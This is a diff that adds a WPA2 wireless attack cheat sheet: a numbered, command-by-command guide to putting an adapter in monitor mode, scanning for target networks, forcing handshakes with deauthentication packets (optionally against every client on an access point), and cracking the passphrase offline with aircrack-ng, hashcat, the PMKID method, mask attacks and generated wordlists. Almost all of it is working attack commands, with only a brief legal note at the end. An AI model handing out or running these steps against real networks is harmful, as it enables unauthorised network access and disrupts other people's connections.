@@ -1,0 +1,101 @@
+WPA2 WIRELESS ATTACK CHEATSHEET
+
+OVERVIEW
+WPA2 uses CCMP/AES encryption. The attack goal is to capture a 4-way handshake then crack the PSK offline.
+WPA2-Personal uses a shared passphrase (PSK). WPA2-Enterprise uses RADIUS and is harder to crack.
+
+REQUIRED TOOLS
+aircrack-ng suite: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng
+hashcat (GPU cracking, much faster than aircrack-ng)
+hcxdumptool + hcxtools (modern PMKID method, no client needed)
+Kali Linux or ParrotOS recommended
+Compatible USB WiFi adapter with monitor mode + packet injection support
+
+RECOMMENDED ADAPTERS
+Alfa AWUS036ACH (dual band, strong injection)
+Alfa AWUS036NHA (2.4GHz, very reliable)
+TP-Link TL-WN722N v1 only (v2/v3 use different chipset, no injection)
+
+STEP 1: ENABLE MONITOR MODE
+Check interface name: iwconfig or ip a
+Kill interfering processes: sudo airmon-ng check kill
+Enable monitor mode: sudo airmon-ng start wlan0
+Interface becomes wlan0mon
+Verify: iwconfig wlan0mon (should show Mode:Monitor)
+
+STEP 2: SCAN FOR TARGETS
+sudo airodump-ng wlan0mon
+Shows: BSSID (router MAC), CH (channel), ESSID (network name), #Data, AUTH
+Note target BSSID and channel before proceeding
+
+STEP 3: CAPTURE HANDSHAKE
+Lock onto target channel:
+sudo airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
+-c = channel number
+--bssid = target router MAC
+-w = output file prefix (saves as capture-01.cap)
+Wait for a client to connect naturally, OR force handshake with deauth
+
+STEP 4: DEAUTHENTICATION ATTACK (force handshake)
+Open second terminal while airodump-ng is still running:
+sudo aireplay-ng -0 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon
+-0 = deauth attack
+10 = number of deauth packets (use 0 for continuous)
+-a = target AP BSSID
+-c = target client MAC (seen in airodump-ng STATION column)
+Omit -c to deauth all clients on the AP
+Watch airodump-ng top right for: WPA handshake: [BSSID]
+
+STEP 5: VERIFY HANDSHAKE
+aircrack-ng capture-01.cap
+Should show: 1 handshake found
+
+STEP 6A: CRACK WITH AIRCRACK-NG (CPU)
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture-01.cap
+-w = wordlist path
+-b = target BSSID
+Slow on CPU. Good for quick tests with small wordlists.
+
+STEP 6B: CRACK WITH HASHCAT (GPU, recommended)
+Convert .cap to hashcat format:
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+or older method:
+cap2hccapx capture-01.cap capture.hccapx
+
+Run hashcat:
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+-m 22000 = WPA2 mode (new format)
+-m 2500 = WPA2 mode (old hccapx format)
+--force = ignore GPU warnings
+
+STEP 7: PMKID ATTACK (no client needed, modern method)
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+hashcat -m 22000 hash.hc22000 wordlist.txt
+Faster because you don't need to wait for a client handshake.
+
+HASHCAT USEFUL FLAGS
+-a 0 = dictionary attack (default)
+-a 1 = combinator attack
+-a 3 = brute force/mask attack
+-r rules/best64.rule = apply mutation rules
+--show = show cracked passwords after session
+--session=wifi1 = name session for resuming
+--restore = resume previous session
+Example mask attack (8 digit number): hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+
+WORDLISTS
+/usr/share/wordlists/rockyou.txt (14 million passwords, Kali built-in)
+SecLists: github.com/danielmiessler/SecLists
+CrackStation wordlist (1.4 billion, huge)
+Custom: use crunch to generate by pattern
+crunch 8 8 0123456789 -o numbers8.txt (all 8-digit numbers)
+
+DISABLE MONITOR MODE (cleanup)
+sudo airmon-ng stop wlan0mon
+sudo systemctl restart NetworkManager
+
+LEGAL NOTE
+Only perform on networks you own or have explicit written authorization to test.
+Unauthorized access is illegal under computer fraud laws worldwide.
